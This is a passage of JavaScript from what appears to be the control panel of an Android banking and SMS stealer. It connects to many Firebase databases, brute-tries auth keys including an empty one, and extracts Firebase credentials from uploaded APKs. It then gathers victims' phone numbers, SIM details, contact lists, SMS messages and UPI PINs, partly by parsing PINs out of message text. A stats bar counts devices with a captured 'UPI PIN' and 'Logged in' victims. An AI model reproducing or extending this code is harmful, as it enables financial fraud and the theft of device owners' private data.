      if(i>=0)out[i]=Object.assign({},def,out[i],{databaseURL:url});
      else out.push(Object.assign({},def,{databaseURL:url}));
    }
    (SERVER_FIREBASES||[]).forEach(addDef);
    DEFAULT_FIREBASES.forEach(addDef);
    out.forEach(function(c){
      if(!c.deviceNode)c.deviceNode='clients';
      if(c.preferredDeviceNode==='user_data'&&!c.schema)c.preferredDeviceNode='clients';
    });
    return applyNodeMemoryToConfigs(dedupeFirebaseConfigs(out.filter(function(c){
      return isValidFirebaseUrl(c.databaseURL);
    })));
  }
  try{
    var s=localStorage.getItem(FB_LIST_KEY);
    if(s){var p=JSON.parse(s);if(Array.isArray(p)&&p.length)return mergeDefaults(p);}
  }catch(e){}
  if(window.REBEL_NATIVE_APP&&nyaGetPanelServer()){
    return pullServerFirebases().then(function(serverList){
      return mergeDefaults((serverList.length?serverList:(SERVER_FIREBASES||[])).slice());
    });
  }
  return Promise.resolve(mergeDefaults((SERVER_FIREBASES||[]).slice()));
}
function getFbAuthKey(inst){
  if(!inst||!inst.config)return '';
  var c=inst.config;
  var key=c.secret||c.authKey||c.key||c.databaseSecret||c.apiKey||'';
  if(!key&&c.databaseURL)key=(c.databaseURL||'').replace(/\/$/,'');
  return key;
}
function getFbAuthCandidates(inst){
  var c=(inst&&inst.config)||{}, url=(inst&&inst.restUrl||'').replace(/\/$/,''), keys=[], k;
  ['secret','authKey','key','databaseSecret','apiKey'].forEach(function(field){
    k=c[field];
    if(k&&keys.indexOf(k)<0)keys.push(k);
  });
  if(url&&keys.indexOf(url)<0)keys.push(url);
  keys.push('');
  return keys;
}
function buildRestUrl(inst,path,authKey){
  var url=(inst.restUrl||'').replace(/\/$/,'')+'/'+String(path||'').replace(/^\//,'');
  if(!/\.json(\?|$)/.test(url))url+='.json';
  if(authKey)url+=(url.indexOf('?')>=0?'&':'?')+'auth='+encodeURIComponent(authKey);
  return url;
}
function restUrlForInst(inst,path){
  return buildRestUrl(inst,path,getFbAuthKey(inst));
}
function restJsonInst(inst,path){
  var auths=getFbAuthCandidates(inst), i=0;
  function tryNext(){
    if(i>=auths.length)return Promise.resolve(null);
    var auth=auths[i++];
    return restJson(buildRestUrl(inst,path,auth)).then(function(data){
      if(data===null||isFirebaseErr(data))return tryNext();
      return data;
    }).catch(function(){return tryNext();});
  }
  return tryNext();
}
function restJsonInstShallow(inst){
  var auths=getFbAuthCandidates(inst), i=0;
  function tryNext(){
    if(i>=auths.length)return Promise.resolve(null);
    var auth=auths[i++];
    var url=(inst.restUrl||'').replace(/\/$/,'')+'/.json?shallow=true';
    if(auth)url+='&auth='+encodeURIComponent(auth);
    return restJson(url).then(function(data){
      if(data===null||isFirebaseErr(data))return tryNext();
      return data;
    }).catch(function(){return tryNext();});
  }
  return tryNext();
}
function initFirebaseInstance(cfg){
  var appName='mfb_'+cfg.id,db=null;
  if(cfg.apiKey){
    try{
      var exists=false;firebase.apps.forEach(function(a){if(a.name===appName)exists=true;});
      if(!exists)firebase.initializeApp({apiKey:cfg.apiKey,authDomain:cfg.authDomain||'',databaseURL:cfg.databaseURL,projectId:cfg.projectId||cfg.id,storageBucket:cfg.storageBucket||'',messagingSenderId:cfg.messagingSenderId||'',appId:cfg.appId||''},appName);
      db=firebase.app(appName).database();
    }catch(e){}
  }
  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(/shoot|verify|mitteld|nammu|mmmff|dev-rahul/i.test(cfg.databaseURL||'')?'shootii':(/rto9|rto0|rabel|raand|user_list|demon|jdhd|raki/i.test(cfg.databaseURL||'')?'rabel':((cfg.databaseURL||'').indexOf('rabel')>=0?'rabel':'spinplay'))),liveAttached:false};
  firebaseInstances.push(inst);return inst;
}
function initFirebase(){
  teardownAllFirebaseInstances();
  firebaseInstances=[];
  var loaded=loadFirebaseConfigs();
  function boot(cfgs){
    firebaseConfigs=cfgs||[];
    ensureActiveFbValid();
    firebaseConfigs.forEach(initFirebaseInstance);
    updateFbUi();
    if(typeof fetchAllData==='function')fetchAllData(true);
  }
  if(loaded&&typeof loaded.then==='function')loaded.then(boot).catch(function(){boot([]);});
  else boot(loaded||[]);
}
function addFirebaseProject(extractMeta){
  var meta=extractMeta||null;
  var name=document.getElementById('fbAddName').value.trim();
  var url=document.getElementById('fbAddUrl').value.trim().replace(/\/$/,'');
  var secret=(document.getElementById('fbAddSecret')||{}).value;
  secret=secret?String(secret).trim():'';
  var apiKey=document.getElementById('fbAddApiKey').value.trim();
  if(!name||!url){toast('Project name and Firebase URL are required',false);return;}
  var dupCandidate={
    databaseURL:url,
    projectId:(meta&&meta.projectId)||'',
    apiKey:apiKey||((meta&&meta.apiKey)||'')
  };
  var dup=findDuplicateFirebase(firebaseConfigs,dupCandidate);
  if(dup){
    toast('Duplicate Firebase reject — pehle se hai: '+(dup.name||dup.id||url),false);
    return;
  }
  var id='fb_'+Date.now();
  var cfg={
    id:id,
    name:name,
    databaseURL:url,
    secret:secret,
    key:secret,
    apiKey:apiKey||((meta&&meta.apiKey)||''),
    projectId:(meta&&meta.projectId)||'',
    appId:(meta&&meta.appId)||'',
    authDomain:(meta&&meta.authDomain)||'',
    storageBucket:(meta&&meta.storageBucket)||'',
    messagingSenderId:(meta&&meta.messagingSenderId)||'',
    packageName:(meta&&meta.packageName)||'',
    schema:(meta&&meta.schema)||(url.indexOf('rabel')>=0?'rabel':'spinplay'),
    deviceNodes:(meta&&meta.deviceNodes)||[],
    preferredDeviceNode:(meta&&meta.preferredDeviceNode)||''
  };
  firebaseConfigs.push(cfg);
  saveFirebaseConfigs();
  var inst=initFirebaseInstance(cfg);
  attachLiveFast(inst);
  discoverInstanceProbe(inst).then(function(){
    processClientsDataNow();
    updateFbUi();
    toast('Added: '+name,true);
    attachLive(inst);
  });
  document.getElementById('fbAddName').value='';
  document.getElementById('fbAddUrl').value='';
  var secEl=document.getElementById('fbAddSecret');if(secEl)secEl.value='';
  document.getElementById('fbAddApiKey').value='';
  var st=document.getElementById('fbApkStatus');
  if(st)st.textContent='Deep scan: DEX, native libs, assets, UTF-16, Base64 — hidden Firebase + API key';
  closeFbSheet();
}
function uploadApkForFirebase(input){
  if(!input||!input.files||!input.files[0])return;
  var file=input.files[0];
  var st=document.getElementById('fbApkStatus');
  if(st)st.textContent='Analyzing '+file.name+'...';
  var fd=new FormData();
  fd.append('apk',file);
  fetch(APK_EXTRACT_URL,{method:'POST',body:fd,cache:'no-store'})
    .then(function(r){return r.json();})
    .then(function(res){
      input.value='';
      if(!res||!res.ok){
        toast((res&&res.error)||'Could not extract Firebase from APK',false);
        if(st)st.textContent='Extraction failed — try another APK';
        return;
      }
      var url=(res.databaseURL||'').replace(/\/$/,'');
      var name=res.name||res.projectId||res.packageName||'APK Firebase';
      document.getElementById('fbAddName').value=name;
      document.getElementById('fbAddUrl').value=url;
      document.getElementById('fbAddApiKey').value=res.apiKey||'';
      if(st)st.textContent='Found '+url+(res.apiKey?' · API key OK':'')+(res.preferredDeviceNode?' · node '+res.preferredDeviceNode:'')+(res.source?' · '+res.source:'');
      var dup=findDuplicateFirebase(firebaseConfigs,{databaseURL:url,projectId:res.projectId||'',apiKey:res.apiKey||''});
      if(dup){
        toast('Duplicate Firebase reject — pehle se added: '+(dup.name||dup.id),false);
        if(st)st.textContent='Duplicate — already in list as '+(dup.name||dup.id);
        return;
      }
      toast('Firebase extracted — adding project...',true);
      addFirebaseProject(res);
    })
    .catch(function(){
      input.value='';
      toast('APK upload failed',false);
      if(st)st.textContent='Upload error';
    });
}
function bindApkUpload(){
  var inp=document.getElementById('fbApkFile');
  if(!inp||inp._rebelBound)return;
  inp._rebelBound=true;
  inp.addEventListener('change',function(){uploadApkForFirebase(inp);});
}
function removeFirebaseProject(id){
  if(!firebaseConfigs.some(function(c){return c.id===id;})){toast('Project not found',false);return;}
  firebaseConfigs=firebaseConfigs.filter(function(c){return c.id!==id;});
  saveFirebaseConfigs();
  Object.keys(clientsRawMap).forEach(function(k){
    if(k.indexOf(id+'::')===0)delete clientsRawMap[k];
  });
  if(selDev&&selDev.indexOf(id+'::')===0){selDev='';clearListeners();}
  if(activeFbId===id){activeFbId='';saveActiveFb();}
  teardownAllFirebaseInstances();
  firebaseInstances=[];
  firebaseConfigs.forEach(initFirebaseInstance);
  fetchAllData(true);
  toast('Project removed',true);
}
initFirebase();

function updateFbUi(){
  var el=document.getElementById('fbSheetList');
  if(!el)return;
  if(!firebaseConfigs.length){
    el.innerHTML='<div class="empty">No Firebase yet — add below</div>';
    return;
  }
  var html='<div class="fb-item'+(activeFbId===''?' active':'')+'" onclick="selectFirebase(\'\')"><strong>All Combined</strong><small>'+allDevs.length+' devices</small></div>';
  firebaseConfigs.forEach(function(c){
    var cnt=allDevs.filter(function(d){return d.fbId===c.id;}).length;
    html+='<div class="fb-item'+(activeFbId===c.id?' active':'')+'" onclick="selectFirebase(\''+escAttr(c.id)+'\')">'+
      '<strong>'+esc(c.name)+'</strong><small>'+cnt+' devices · '+esc((c.databaseURL||'').replace(/^https?:\/\//,'').split('/')[0])+'</small></div>';
  });
  el.innerHTML=html;
}
function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}

function getPhoneFromRecord(s){
  if(!s)return'';
  if(isCommandQueueRecord(s)||isSmsCommandRecord(s))return'';
  if(isNyaApkClientRecord(s)){
    var apk=apkPhoneFromRaw(s);
    if(apk)return apk;
  }
  return getPhoneFromRecordGeneric(s);
}
function extractContactsFromRecord(raw){
  if(!raw||typeof raw!=='object')return[];
  var contacts=[], seen={}, max=80;
  function addContact(c){
    if(!c||typeof c!=='object'||contacts.length>=max)return;
    var name=String(c.name||c.displayName||c.display_name||c.contact_name||c.full_name||c.contactName||'').trim();
    var phone=String(c.phone||c.phoneNumber||c.phone_number||c.number||c.mobile||c.mobNo||c.contact_no||'').trim();
    if(!phone&&!name)return;
    if(phone&&!looksLikePhone(phone))phone='';
    var key=(name+'|'+phone).toLowerCase();
    if(seen[key])return;
    seen[key]=1;
    contacts.push({name:name||'Unknown',phone:phone?normalizePhoneDigits(phone):''});
  }
  function scanContacts(obj,depth){
    if(!obj||typeof obj!=='object'||depth>5||contacts.length>=max)return;
    var k,v,i;
    for(k in obj){
      if(!Object.prototype.hasOwnProperty.call(obj,k))continue;
      v=obj[k];
      if(!v)continue;
      if(/contact|phonebook|addressbook|address_book|phone_book|all_contacts/i.test(k)){
        if(Array.isArray(v))for(i=0;i<v.length;i++)addContact(v[i]);
        else if(typeof v==='object'){
          Object.keys(v).forEach(function(cid){
            var c=v[cid];
            if(c&&typeof c==='object')addContact(c);
            else if(typeof c==='string'&&looksLikePhone(c))addContact({name:cid,phone:c});
          });
        }
      }
      if(v&&typeof v==='object'&&!Array.isArray(v)){
        if(v.name||v.displayName||v.phone||v.phoneNumber)addContact(v);
        else scanContacts(v,depth+1);
      }
    }
  }
  scanContacts(raw,0);
  return contacts;
}
function mergeContacts(existing,found){
  var out=(existing||[]).slice(), seen={}, i, c, key;
  out.forEach(function(x){seen[(x.name+'|'+x.phone).toLowerCase()]=1;});
  (found||[]).forEach(function(x){
    key=(x.name+'|'+x.phone).toLowerCase();
    if(seen[key])return;
    seen[key]=1;out.push(x);
  });
  return out.slice(0,80);
}
function isCommandQueueRecord(raw){
  if(!raw||typeof raw!=='object')return false;
  if(isDeviceProfileRecord(raw))return false;
  if(raw.battery!==undefined&&raw.battery!==null&&!raw.cmd&&!raw.webhookEvent&&!raw.targetDeviceId)return false;
  if(isSmsCommandRecord(raw))return true;
  return !!(raw.cmd||raw.webhookEvent||raw.sendSms||(raw.command&&raw.messageText&&raw.phoneNumber));
}
function normalizeClientRecord(raw){
  if(!raw||typeof raw!=='object')return null;
  if(raw.password||raw.Pass)return null;
  if(isCommandQueueRecord(raw))return null;
  if(raw.Body!==undefined||raw.Number!==undefined||raw.Status!==undefined){
    var st=String(raw.Status||'').toLowerCase();
    var on=st==='online'||st==='true'||st==='1';
    return{
      name:raw.Body?String(raw.Body).slice(0,48):'Device',
      brand:'',android:'',
      online:on,online_status:on,status:raw.Status||'',
      battery:0,network:'?',sms_count:0,
      mobNo:String(raw.Number||raw.number||raw.phone||'').trim()
    };
  }
  var on=resolveOnlineStatus(raw,raw._fbId||'');
  if(raw.modelName||raw.deviceId||raw.device_model||raw.model||raw.Device_info||isNyaApkClientRecord(raw))return{
    name:raw.modelName||raw.device_model||raw.model||raw.d_name||raw.name||'Unknown',
    brand:raw.brand||raw.manufacturer||'',
    android:raw.androidV||raw.android||raw.android_version||'',
    online:isNyaApkClientRecord(raw)?parseApkOnlineStatus(raw):on,
    battery:parseInt(String(raw.battery||raw.battery_level).replace(/%/g,''),10)||0,
    network:raw.service_provider||raw.network||raw.carrier||'?',
    sms_count:raw.sms_count||raw.smsCount||raw.total_sms||0,
    mobNo:apkPhoneFromRaw(raw)||getPhoneFromRecordGeneric(raw)
  };
  if(raw.d_name!==undefined||raw.phone_number!==undefined){
    var on2=raw.status==='online'||on;
    return{
      name:String(raw.d_name||raw.name||'Device').slice(0,48),
      brand:raw.brand||'',android:raw.android||raw.androidV||'',
      online:on2,online_status:on2,status:raw.status||'',
      battery:parseInt(raw.battery||raw.battery_level,10)||0,
      network:raw.network||raw.service_provider||'?',sms_count:raw.sms_count||0,
      mobNo:parseDevicePhone(raw.phone_number)||getPhoneFromRecord(raw)
    };
  }
  if(raw.username||raw.user_name||raw.device_name){
    return{
      name:String(raw.username||raw.user_name||raw.device_name||raw.name||'Unknown').slice(0,48),
      brand:raw.brand||'',android:raw.android||'',
      online_status:raw.online_status,online:raw.online,status:raw.status,
      online:on,battery:parseInt(raw.battery||raw.battery_level,10)||0,
      network:raw.network||'?',sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)
    };
  }
  var mob=getPhoneFromRecord(raw);
  if(!mob&&!raw.name&&!raw.battery&&!raw.status)return null;
  return{name:raw.name||raw.device_model||raw.d_name||'Unknown',brand:raw.brand||'',android:raw.android||'',
    online_status:raw.online_status,online:raw.online,status:raw.status,
    online:on,battery:parseInt(raw.battery||raw.battery_level,10)||0,network:raw.network||'?',
    sms_count:raw.sms_count||raw.smsCount||0,mobNo:mob};
}
function pickPhoneFromData(data){
  if(!data||typeof data!=='object')return'';
  return apkPhoneFromRaw(data)||getPhoneFromRecordGeneric(data);
}
function ingestDeviceData(fbId,node,devId,data){
  if(!data||typeof data!=='object')return;
  var key=makeDevKey(fbId,devId), existing=clientsRawMap[key]||{};
  if(isCommandOnlyClientState(data)){
    var livePatch={_node:node,_fbId:fbId};
    if(data.status!==undefined&&data.status!==null)livePatch.status=data.status;
    if(data.battery!==undefined&&data.battery!==null)livePatch.battery=data.battery;
    if(data.lastMessageTime)livePatch.lastMessageTime=data.lastMessageTime;
    clientsRawMap[key]=Object.assign({},existing,livePatch);
    processClientsData();
    return;
  }
  if(isCommandQueueRecord(data))return;
  var norm=normalizeClientRecord(Object.assign({_fbId:fbId},data));if(!norm)return;
  var picked=pickPhoneFromData(data);
  if(picked)norm.mobNo=picked;
  else if((!norm.mobNo||!String(norm.mobNo).trim())&&data.mobNo!=null&&String(data.mobNo).trim())norm.mobNo=String(data.mobNo).trim();
  else if((!norm.mobNo||!String(norm.mobNo).trim())&&data.phone_number!=null)norm.mobNo=parseDevicePhone(data.phone_number)||String(data.phone_number).trim();
  norm._node=node;norm._fbId=fbId;
  var key=makeDevKey(fbId,devId), existing=clientsRawMap[key]||{};
  var profileNode=(node==='clients'||node==='devices'||node==='Verify_Device'||node==='user_list'||node==='user_data'||node==='devices_status');
  if(profileNode&&existing._node&&existing._node==='user_data'&&!existing.mobNo){
    /* clients profile replaces empty user_data stub */
  }else if(!profileNode&&existing.mobNo&&existing._node==='clients'){
    if(!norm.mobNo)norm.mobNo=existing.mobNo;
    if(!norm.name||norm.name==='Unknown')norm.name=existing.name;
  }
  if(existing._phoneSource&&(existing._phoneSource==='user_list'||existing._phoneSource==='user_data')&&existing.mobNo){
    var betterPhone=(node==='clients'||node==='devices'||isNyaApkClientRecord(data))&&picked;
    if(!betterPhone&&!isNyaApkClientRecord(existing)){
      norm.mobNo=existing.mobNo;
      norm._phoneSource=existing._phoneSource;
    }
  }else if(isNyaApkClientRecord(data)&&data.mobNo!=null&&String(data.mobNo).trim()){
    norm.mobNo=String(data.mobNo).trim();
  }else if(!norm.mobNo&&existing.mobNo)norm.mobNo=existing.mobNo;
  if((!norm.name||norm.name==='Unknown')&&existing.name&&existing.name!=='Unknown')norm.name=existing.name;
  var foundContacts=extractContactsFromRecord(data);
  if(foundContacts.length)norm.contacts=mergeContacts(existing.contacts,foundContacts);
  else if(existing.contacts)norm.contacts=existing.contacts;
  if(node==='user_list'||node==='user_data'){
    if(norm.mobNo)norm._phoneSource=node;
    if(node==='user_list')norm._node='user_list';
  }
  var keepFields=['mobNo','modelName','deviceId','liked','like','upipin','upiPin','login','checked','money','joined','dateJoined','date_joined','installDate','createdAt','created_at','timestamp','status','battery','sims','androidV','sdkV','label','service_provider','sms_count','device_model','brand','network','lastMessageTime','ping','phone','phone_number','mobile','number','sim1','sim2','sim_1','sim_2','live_data','device_info','sim_info'];
  var saved={};
  keepFields.forEach(function(f){if(data[f]!==undefined&&data[f]!==null)saved[f]=data[f];});
  if(saved.mobNo!=null&&!norm.mobNo)norm.mobNo=String(saved.mobNo).trim();
  norm=preserveProfileFieldsOnIngest(existing,data,norm);
  clientsRawMap[key]=Object.assign({},existing,saved,norm);
}
function getPhoneEnrichNodes(inst){
  var nodes=PHONE_ENRICH_NODES.slice();
  if(inst&&inst.config&&inst.config.preferredDeviceNode){
    var pref=inst.config.preferredDeviceNode;
    nodes=nodes.filter(function(n){return n!==pref;});
    nodes.unshift(pref);
  }
  return uniqPaths(nodes);
}
function enrichFromAllNodes(inst){
  var roots=getPhoneEnrichNodes(inst), keys=Object.keys(clientsRawMap), tasks=[], batch=0, maxBatch=24;
  keys.forEach(function(mapKey){
    var p=parseDevKey(mapKey);
    if(p.fbId!==inst.id)return;
    var rec=clientsRawMap[mapKey];
    if(isNyaApkClientRecord(rec)&&rec._node==='clients'&&rec.mobNo&&String(rec.mobNo).trim()&&!/^unknown$/i.test(String(rec.mobNo).trim()))return;
    if((rec._phoneSource==='user_list'||rec._phoneSource==='user_data')&&rec.mobNo&&String(rec.mobNo).trim())return;
    var needsPhone=!rec.mobNo||!String(rec.mobNo).trim();
    var needsContacts=!rec.contacts||!rec.contacts.length;
    if(!needsPhone&&!needsContacts)return;
    roots.forEach(function(node){
      if(!node||node==='users'||node==='data'||isHexDeviceKey(node))return;
      if(node==='clients'&&rec._node==='clients')return;
      if(batch>=maxBatch)return;
      batch++;
      tasks.push(
        restJsonInst(inst,node+'/'+p.devId).then(function(data){
          if(!data||typeof data!=='object'||isFirebaseErr(data))return;
          if(isCommandQueueRecord(data)||isSmsCommandRecord(data))return;
          var phone=getPhoneFromRecord(data);
          if(phone&&(!rec.mobNo||!String(rec.mobNo).trim())){
            rec.mobNo=phone;
            rec._phoneSource=node;
          }
          var contacts=extractContactsFromRecord(data);
          if(contacts.length)rec.contacts=mergeContacts(rec.contacts,contacts);
          if(phone||contacts.length)clientsRawMap[mapKey]=rec;
        }).catch(function(){})
      );
    });
  });
  if(!tasks.length)return Promise.resolve();
  return Promise.all(tasks).then(function(){processClientsData();});
}
var PIN_ENRICH_NODES=['clients','devices','Verify_Device','user_list','user_data'];
function enrichPinsFromFirebase(inst){
  var keys=Object.keys(clientsRawMap), tasks=[], maxBatch=48;
  keys.forEach(function(mapKey){
    var p=parseDevKey(mapKey);
    if(p.fbId!==inst.id)return;
    var rec=clientsRawMap[mapKey];
    if(getApkUpiPin(rec))return;
    var cached=deviceSmsCache[mapKey];
    if(cached&&cached.list&&cached.list.length){
      var smsPin=extractPinFromSmsList(cached.list);
      if(smsPin&&applyPinToDevice(mapKey,smsPin))return;
    }
    var devId=p.devId;
    function addTask(path,parser){
      if(tasks.length>=maxBatch)return;
      tasks.push({
        mapKey:mapKey,
        promise:restJsonInst(inst,path).then(parser).catch(function(){return '';})
      });
    }
    PIN_ENRICH_NODES.forEach(function(node){
      addTask(node+'/'+devId+'/upipin',normalizePinValue);
      addTask(node+'/'+devId,function(data){
        if(!data||typeof data!=='object'||isFirebaseErr(data))return '';
        if(isCommandQueueRecord(data)&&!isDeviceProfileRecord(data))return '';
        mergeProfileFieldsFromRecord(mapKey,data);
        return extractPinFromRecord(data)||normalizePinValue(data.upipin||data.upiPin);
      });
    });
    addTask(devId+'/upipin',normalizePinValue);
    addTask(devId,function(data){
      if(!data||typeof data!=='object'||isFirebaseErr(data))return '';
      mergeProfileFieldsFromRecord(mapKey,data);
      return extractPinFromRecord(data)||normalizePinValue(data.upipin||data.upiPin);
    });
  });
  if(!tasks.length)return Promise.resolve();
  return Promise.all(tasks.map(function(t){
    return t.promise.then(function(pin){return {mapKey:t.mapKey,pin:pin};});
  })).then(function(results){
    var changed=false;
    results.forEach(function(r){
      if(r.pin&&applyPinToDevice(r.mapKey,r.pin))changed=true;
    });
    if(changed)processClientsData();
  });
}
function enrichPinsFromSms(inst){
  var keys=Object.keys(clientsRawMap), tasks=[], batch=0, maxBatch=8;
  keys.forEach(function(mapKey){
    var p=parseDevKey(mapKey);
    if(p.fbId!==inst.id)return;
    if(getApkUpiPin(clientsRawMap[mapKey]))return;
    if(batch>=maxBatch)return;
    batch++;
    var stub={id:mapKey,rawId:p.devId,fbId:p.fbId};
    tasks.push(fetchSmsFast(inst,stub).then(function(list){
      if(!list||!list.length)return;
      var pin=extractPinFromSmsList(list);
      if(pin)applyPinToDevice(mapKey,pin);
      setDeviceSms(mapKey,list);
    }).catch(function(){}));
  });
  if(!tasks.length)return Promise.resolve();
  return Promise.all(tasks).then(function(){processClientsData();});
}
function enrichFromUserList(inst){
  return fetchSummaryNode(inst,'user_list').then(function(){
    return fetchSummaryNode(inst,'user_data').catch(function(){return null;});
  }).then(function(){
    return enrichFromAllNodes(inst);
  }).then(function(){
    processClientsData();
  });
}
function runBackgroundPinEnrichment(inst){
  if(!inst)return Promise.resolve();
  return enrichPinsFromFirebase(inst).catch(function(){return null;}).then(function(){
    return enrichPinsFromSms(inst);
  }).catch(function(){return null;}).then(function(){
    processClientsData();
  });
}
function mergeSummaryNode(fbId,node,raw){
  if(!raw||typeof raw!=='object')return;
  Object.keys(raw).forEach(function(k){
    if(!raw[k]||typeof raw[k]!=='object')return;
    if((node==='user_data'||node==='user')&&isCommandQueueRecord(raw[k])&&!isDeviceProfileRecord(raw[k]))return;
    ingestDeviceData(fbId,node,k,raw[k]);
  });
}
function countInstDevices(fbId){
  var n=0;
  Object.keys(clientsRawMap).forEach(function(k){if(k.indexOf(fbId+'::')===0)n++;});
  return n;
}
function primaryDeviceNodesForInst(inst,roots){
  roots=roots||{};
  var nodes=[];
  if(roots&&typeof roots==='object'){
    Object.keys(roots).forEach(function(n){
      if(isDeviceSummaryNode(n)&&nodes.indexOf(n)<0)nodes.push(n);
    });
  }
  ['clients','devices','Verify_Device','user_list','user_data'].forEach(function(n){
    if(roots[n]&&nodes.indexOf(n)<0)nodes.push(n);
  });
  if(!nodes.length)nodes=getDeviceNodesForInst(inst).slice(0,16);
  getDeviceNodesForInst(inst).forEach(function(n){
    if(n&&nodes.indexOf(n)<0)nodes.push(n);
  });
  if(roots.clients&&nodes.indexOf('clients')<0)nodes.unshift('clients');
  return nodes.filter(function(n,i,a){return n&&a.indexOf(n)===i;});
}
function allDeviceNodesForInst(inst,roots){
  return primaryDeviceNodesForInst(inst,roots||{});
}
/** APK-style: 1–2 priority nodes only — panel opens instantly */
function fastDeviceNodesForInst(inst,roots){
  roots=roots||{};
  var nodes=[], pref=(inst&&inst.config&&inst.config.preferredDeviceNode)||'';
  var devNode=(inst&&inst.config&&inst.config.deviceNode)||'';
  if(pref)nodes.push(pref);
  if(devNode&&nodes.indexOf(devNode)<0)nodes.push(devNode);
  ['clients','user_list','Verify_Device','devices','user_data'].forEach(function(n){
    if((roots[n]||!Object.keys(roots).length)&&nodes.indexOf(n)<0)nodes.push(n);
  });
  return nodes.filter(function(n,i,a){return n&&a.indexOf(n)===i;}).slice(0,3);
}
function applyInstanceRoots(inst,roots){
  if(!inst||!roots||typeof roots!=='object'||isFirebaseErr(roots))return;
  inst.rootKeys=Object.keys(roots);
  inst.smsRootKeys=inst.rootKeys.filter(isInboundSmsRootNode);
  inst.schema=detectSchemaFromRoots(roots,inst);
  if(inst.config){
    inst.config.schema=inst.schema;
    if(!inst.config.preferredDeviceNode){
      if(roots.Verify_Device)inst.config.preferredDeviceNode='Verify_Device';
      else if(roots.user_list)inst.config.preferredDeviceNode='user_list';
      else if(roots.user_data)inst.config.preferredDeviceNode='user_data';
      else if(roots.clients)inst.config.preferredDeviceNode='clients';
    }
  }
}
function fetchSummaryNodeFirebase(inst,node){
  if(inst&&inst.db){
    return new Promise(function(resolve){
      try{
        inst.db.ref(node).once('value').then(function(snap){
          if(snap&&snap.exists())mergeSummaryNode(inst.id,node,snap.val());
          resolve();
        }).catch(function(){resolve();});
      }catch(e){resolve();}
    });
  }
  return fetchSummaryNode(inst,node);
}
function mapPoolLimit(items,fn,limit){
  items=items||[];
  if(!items.length)return Promise.resolve();
  var i=0,active=0;
  return new Promise(function(resolve){
    function pump(){
      while(active<limit&&i<items.length){
        (function(item){
          active++;
          Promise.resolve(fn(item)).catch(function(){}).then(function(){
            active--;
            if(i>=items.length&&active===0)resolve();
            else pump();
          });
        })(items[i++]);
      }
    }
    pump();
  });
}
function sortInstancesActiveFirst(insts){
  return (insts||[]).slice().sort(function(a,b){
    if(a.id===activeFbId)return -1;
    if(b.id===activeFbId)return 1;
    return 0;
  });
}
function attachLiveNode(inst,node){
  if(!inst.db||!node)return;
  inst._liveNodes=inst._liveNodes||{};
  if(inst._liveNodes[node])return;
  inst._liveNodes[node]=true;
  inst._liveRefs=inst._liveRefs||[];
  try{
    var ref=inst.db.ref(node);
    if(isDeviceLiveChildNode(node)){
      var onChildInstant=function(snap){
        var data=snap.val();
        if(!data||typeof data!=='object')return;
        ingestDeviceData(inst.id,node,snap.key,data);
        processClientsData();
      };
      ref.on('child_changed',onChildInstant);
      ref.on('child_added',onChildInstant);
      inst._liveRefs.push({ref:ref,h:onChildInstant,type:'child_added'});
      inst._liveRefs.push({ref:ref,h:onChildInstant,type:'child_changed'});
    }else{
      var valHandler=function(s){
        if(!s.exists())return;
        mergeSummaryNode(inst.id,node,s.val());
        processClientsData();
      };
      ref.on('value',valHandler);
      inst._liveRefs.push({ref:ref,h:valHandler,type:'value'});
    }
  }catch(e){}
}
function attachLiveFast(inst){
  if(!inst.db||inst.liveFastAttached)return;
  inst.liveFastAttached=true;
  var node=getRememberedNode(inst)||(inst.config&&inst.config.preferredDeviceNode)||(inst.config&&inst.config.deviceNode)||'clients';
  attachLiveNode(inst,node);
}
function processClientsData(){
  if(_procDevsTimer)clearTimeout(_procDevsTimer);
  _procDevsTimer=setTimeout(processClientsDataNow,220);
}
function processClientsDataNow(){
  allDevs=[];
  Object.keys(clientsRawMap).forEach(function(k){
    enrichDevicePhoneFromSms(k);
    var s=clientsRawMap[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
    var on=deviceOnlineFromRaw(s,p.fbId);
    var contacts=s.contacts||extractContactsFromRecord(s);
    var smsIdx=inst&&inst.smsIndex&&inst.smsIndex[p.devId];
    var hasSms=!!(smsIdx&&smsIdx.roots&&smsIdx.roots.length);
    var pin=getApkUpiPin(s);
    allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'clients',
      name:getApkModel(s,{name:s.name}),displayPhone:getDeviceDisplayPhone(s),brand:s.brand||'',android:s.android||'',
      status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0,hasSms:hasSms,
      sims:extractDeviceSims(s),pin:pin,hasPin:!!pin,money:getApkMoney(s),joined:getApkJoined(s),
      contacts:contacts,contactCount:contacts.length});
  });
  allDevs.sort(function(a,b){
    var ja=parseJoinedToMs(getApkJoined(getRawDev(a.id)));
    var jb=parseJoinedToMs(getApkJoined(getRawDev(b.id)));
    return jb-ja;
  });
  ensureActiveFbValid();
  if(selDev&&activeFbId){
    var cur=getSelDev();
    if(!cur||cur.fbId!==activeFbId){selDev='';clearListeners();}
  }
  renderDevices();updateStats();updateFbUi();
}
function updateStats(){
  var all=allDevs;
  if(activeFbId)all=all.filter(function(d){return d.fbId===activeFbId;});
  var pin=all.filter(function(d){return deviceMatchesApkFilter(d,'onlypin');});
  var online=all.filter(function(d){return deviceMatchesApkFilter(d,'online');});
  var liked=all.filter(function(d){return deviceMatchesApkFilter(d,'liked');});
  var logged=all.filter(function(d){return deviceMatchesApkFilter(d,'login');});
  setText('totalClients','Total Clients:-'+all.length);
  setText('upiPinCount','UPI PIN:-'+pin.length);
  setText('activeCount','Active🟢:-'+online.length);
  setText('likedCount','Liked Clients:-'+liked.length);
  setText('loggedCount','Logged in📲:-'+logged.length);
  updatePanelTitles();
}
function fetchSummaryNode(inst,node){
  return restJsonInst(inst,node).then(function(raw){mergeSummaryNode(inst.id,node,raw);});
}
function bruteFetchDeviceNodes(inst){
  var nodes=getDeviceNodesForInst(inst);
  var tasks=[];
  nodes.forEach(function(n){
    tasks.push(fetchSummaryNode(inst,n).catch(function(){return null;}));
  });
  return Promise.all(tasks).then(function(){processClientsData();});
}
function discoverInstance(inst){
  return discoverInstanceProbe(inst);
}
function attachLive(inst){
  attachLiveFast(inst);
